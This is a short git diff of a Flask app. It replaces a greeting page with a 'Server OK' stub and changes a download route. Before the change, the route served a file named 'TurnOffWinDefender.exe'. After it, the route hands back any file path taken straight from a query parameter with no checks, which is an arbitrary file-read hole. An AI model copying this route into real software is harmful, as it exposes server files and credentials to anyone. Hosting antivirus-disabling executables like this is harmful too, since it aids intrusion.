@@ -10,19 +10,15 @@ app = Flask(__name__)
 
 @app.route('/')
 def homepage():
-	the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")
-
 	return """
-	    <h1>Hello heroku</h1>
-	    <p>It is currently {time}.</p>
-
-	    <img src="http://loremflickr.com/600/400" />
-	    """.format(time=the_time)
+	    <h1>Server OK</h1
+	    """
 #===========================download file================================
-@app.route('/return-files/')
+@app.route('/return-files', methods=['GET'])
 def return_files_tut():
 	try:
-		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
+		file = str(request.args.get('file'))
+		return send_file(file, attachment_filename=file)
 	except Exception as e:
 		return str(e)
 	
